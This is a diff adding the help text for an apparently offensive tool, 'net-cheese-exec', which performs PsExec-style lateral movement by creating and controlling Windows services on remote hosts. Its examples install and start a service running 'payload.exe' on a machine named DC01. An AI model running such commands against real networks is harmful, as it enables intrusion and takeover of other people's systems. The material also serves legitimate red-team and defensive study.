@@ -1,0 +1,26 @@
+ABOUT
+    PsExec like command execution and lateral movement via Windows service creation.
+    Must run in the context of a privileged user. Supports create, start, stop,
+    delete, and restart actions on a remote service.
+
+USAGE:
+    net-cheese-exec --- <targetMachine> <serviceName> <binPath> <action>
+
+ARGUMENTS:
+    targetMachine       Remote host to target
+    serviceName         Name of the Windows service
+    binPath             Path to the executable for the service binary path
+    action              One of: create, start, stop, delete, restart
+
+EXAMPLES:
+    net-cheese-exec --- DC01 MyService C:\Windows\Temp\payload.exe create
+    net-cheese-exec --- DC01 MyService C:\Windows\Temp\payload.exe start
+    net-cheese-exec --- DC01 MyService C:\Windows\Temp\payload.exe stop
+    net-cheese-exec --- DC01 MyService C:\Windows\Temp\payload.exe delete
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    net-cheese-exec -w 60 --- DC01 MyService C:\Windows\Temp\payload.exe create
